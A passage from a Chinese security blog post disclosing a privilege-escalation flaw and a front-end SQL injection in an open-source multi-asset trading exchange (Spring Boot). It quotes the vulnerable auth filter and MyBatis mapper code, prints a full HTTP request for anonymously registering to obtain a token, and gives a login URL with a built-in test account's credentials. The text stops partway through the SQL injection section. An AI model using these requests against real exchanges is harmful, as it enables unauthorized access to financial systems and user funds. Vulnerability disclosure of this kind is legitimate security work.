---
title: 某34国语言综合GP交易所存在前台SQL注入漏洞 (Java)
url: https://mp.weixin.qq.com/s/-dVfp5G0RhMsPU95U-0bQQ
source: Doonsec's feed
date: 2026-06-28
fetch_date: 2026-06-29T06:32:42.672852
---

# 某34国语言综合GP交易所存在前台SQL注入漏洞 (Java)

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/De3yb4u5JSoTDfQKwM2q1nbQql4knE4bzLH3krg7fdpdgb5yGr4v6UrRCwb8XdmhGeRShO91yicf30lQhL0E3FClAVZsnv5mGRuvrodgQWy0/0?wx_fmt=jpeg)

# 某34国语言综合GP交易所存在前台SQL注入漏洞 (Java)

原创

XingYue404
XingYue404

星悦安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&randomid=1jvfty28&tp=webp#imgIndex=0)

点击上方蓝字关注我们 并设为星标

## 0x00 前言

漏洞完全由AI分析，无特殊提示词 Skill，同款见文末.

**34国语言综合股票交易所开源源码 为一套功能完整的综合性在线交易系统，公开资料提及支持加密货币现货/合约/期权、外汇、全球股票、ETF、大宗商品、跟单、C2C、NFT、理财借贷等数十个业务模块，**

**技术栈 : Java Spring Boot 2.7 + Vue3/Vue2 + MySQL + Redis**

**Fofa指纹(后端) : 自己找**

![](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSp9nUwLWmjEFnBBVOZaIMMDRPWvD52wW0Y87j6wWFHySdxLjyasfrbGPbEeCDjsckEDKsuAyvtficBIBVndyRpHvZdRep3WlJRQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSr2I2gEs9qa6aRibAnuJYfyfP8LWQfoaYRfvJ8AkCv0oJ5Gw3gGrZ1o5qDhibXXfDknBlwvcbJY8Z3OO3SeOiblNia5KWEcfo1pEWw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSqTBRgXJ1pyVQE2vbtrHBjicYEtJpw5gFbO8jnbgxRYk5BaRGQnz6u450ibZRAwp20YrO2Nc1xhurZGDcZNVWa505XloucZBXMck/640?wx_fmt=png&from=appmsg)

## 0x01 前台垂直越权漏洞

**全局过滤器**`AuthFilter.doFilter`**（**`/trad-admin/trading-order-security-common/src/main/java/com/yami/trading/security/common/filter:156-237`**）只校验 token 是否有效（**`tokenStore.getUserInfoByAccessToken`**），解析成功后仅**`AuthUserContext.set(userInfoInToken)`**即放行，****从不判断 token 的**`sysType`**（ADMIN / ORDINARY）能否访问当前控制器**

```
if (StrUtil.isNotBlank(accessToken)) {
    try {
        userInfoInToken = tokenStore.getUserInfoByAccessToken(accessToken, true);
        if (userInfoInToken.getSysType().intValue() == SysTypeEnum.ORDINARY.value().intValue()) {
            String userId = userInfoInToken.getUserId();
            // 缓存优化 TODO
            User userEntity = userService.cacheUserBy(userId);
            if (userEntity != null) {
                userCode = userEntity.getUserCode();
            }
        }
    } catch (Exception e) {
        if (e instanceof YamiShopBindException) {
            logger.error("---> AuthFilter doFilter 处理 uri:{}, accessToken:{} 报 YamiShopBindException 异常:{}", requestUri, accessToken, e.getMessage());
            tokenErr = (YamiShopBindException)e;
        } else {
            logger.error("---> AuthFilter doFilter 处理 uri:{}, accessToken:{} 报错:", requestUri, accessToken, e);
            throw e;
        }
    }
}
// 处理黑名单访问，断网逻辑
if (checkBlackRequest(req, resp, clientIp, userCode)) {
    return;
}

try {
    // 识别时区信息
    processTimezone(req);

    // 白名单
    if (servletPathWhiteUri) {
        chain.doFilter(req, resp);
        return;
    }

    //
    if (ObjectUtils.isNotEmpty(VERSION_NUMBER)) {
        // 验证时间戳签名
        if (checkSign(req,response)) {
            return;
        }
    }

    // 当前 uri 不用检查是否携带 token，直接执行对应的接口
    if (ignoreTokenUri) {
        chain.doFilter(req, resp);
        return;
    }

    // 有 token 就用，没 token 也无所谓的 api
    if (userInfoInToken != null) {
        // 如果有 token，并且解析成功，则走以下处理逻辑
        // 已移除IP检查逻辑，不再进行IP地址验证
        // if (userInfoInToken.getSysType().intValue() == SysTypeEnum.ADMIN.value().intValue()) {
        //     if (!pathMatcher.match("/updateCheckIp", requestUri)) {
        //         Object loginIP = RedisUtil.get(RedisKeys.ACCESS_IP + userInfoInToken.getUserId());
        //         if (null != loginIP && !IPHelper.equalIpSegment(loginIP.toString(), clientIp)) {
        //             logger.error("The Login IP Is Inconsistent With The Operation IP! Login-IP:{} Access-IP:{} Servlet-Path:{}", loginIP, clientIp, servletPath);
        //             httpHandler.printServerResponseToWeb("", 1001);
        //             return;
        //         }
        //     }
        // }

        // 保存上下文
        AuthUserContext.set(userInfoInToken);
    } elseif (!optionalTokenUri) {
        // token 必填的路径
        // 如果没有 token，或者 token 解析失败/过期，但是当前请求 uri 又不是一个可选 token 的uri，则报错，提示 token 无效
        // 返回前端401
                logger.error("---> requestUri:{} 未配置 optional 白名单", requestUri);
                httpHandler.printServerResponseToWeb("您的账号已过期或已经在其他地方登录，请重新登录", 403);
                return;
            }
            if (tokenErr != null) {
                // 前面解析 token 报错，此处抛出
                throw tokenErr;
            }

            // token 逻辑校验顺利
            chain.doFilter(req, resp);
```

**授权完全依赖各方法上的**`@PreAuthorize`**（**`@EnableGlobalMethodSecurity`**）。经统计**`@PreAuthorize`**仅出现在 5 个**`sys/*`**控制器（共 21 处）****，其余约 150 个资金类后台控制器****没有任何方法级授权****。**

**SecurityUtils.getSysUser()（SecurityUtils.java:14-31）对 ORDINARY 与 ADMIN token 一视同仁返回非空对象，不区分来源。**

```
public YamiSysUser getSysUser() {
    UserInfoInTokenBO userInfoInTokenBO = AuthUserContext.get();
    if(userInfoInTokenBO == null){
        returnnull;
    }
    YamiSysUser details = new YamiSysUser();
    String userId = userInfoInTokenBO.getUserId();
    // 兼容swagger 请求情况
    if(StringUtils.isEmpty(userId)){
        returnnull;
    }
    details.setUserId(Long.valueOf(userId));
    details.setEnabled(userInfoInTokenBO.getEnabled());
    details.setUsername(userInfoInTokenBO.getNickName());
    details.setAuthorities(userInfoInTokenBO.getPerms());
    details.setShopId(userInfoInTokenBO.getShopId());
    return details;
}
```

**而****token 可经****白名单内的匿名注册接口**`/api/registerNoVerifcode`**、**`/api/user/register`**（验证码校验被注释）零成本批量获取.**

**Payload(匿名创建用户获取Token):**

```
POST /api/registerNoVerifcode HTTP/2
Host: 127.0.0.1
Content-Length: 54
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Sec-Fetch-User: ?1
Priority: u=0, i
Connection: close

userName=deep666&password=Passw0rd666&userCode=&type=3
```

**![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSrOTxl3aJcT4NXtlyTfsvcyQIKsEQLlQlMhQTamoDAxoy84IfwcUAafIoDxIosCHjVICU3YN6DjDbhQy4ZY4MYwiaEDOcRG6hSI/640?wx_fmt=png&from=appmsg)**

**如果系统没有 /api/registerNoVerifcode 这个接口，还能通过 /api/user/login 接口登入一些系统内置测试账户来获取到 Token，如下 GET 访问**

```
/api/user/login?language=en&username=ceshi2&password=123456
```

![image.png](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSp60saO4IgXeZsWiclxealyJFib6ia527fHbkDgic9ude38ka0FtGVf2OEKGI9cWDmKE5HNYq3sx3W8ic4Nbo4qTYHTBsqUNCOvMskU/640?wx_fmt=png&from=appmsg)

**而获取到 Token 之后，我们就直接能操纵后台的一些接口了，权限成功提升不少，很多操作都可以用了，这里不多说.**

## 0x02 前台SQL注入漏洞

**sink**`C2cPaymentMethodMapper.xml:26`

**链路**`C2cPaymentMethodController.java:96`**→**`C2cPaymentMethodServiceImpl.java:42-44`**→**`C2cPaymentMethodMapper.java:12-16`

**C2cPaymentMethodMapper.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN""http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.yami.trading.dao.c2c.C2cPaymentMethodMapper">

    <select id="listPage" resultType="com.yami.trading.bean.c2c.dto.C2cPaymentMethodDto">
        select
        cpm.*,
        party.user_id ,
        party.user_code ,
        party.user_name
        from
        t_c2c_payment_method cpm
        left join tz_user party on cpm.party_id = party.user_id
        left join t_c2c_user cu on cu.c2c_user_party_id = party.user_id
        where
        1 = 1  and cpm.type=#{type}
          <if test="loginPartyId!=null and loginPartyId!=''">
            and cu.c2c_manager_party_id=#{loginPartyId}
      ...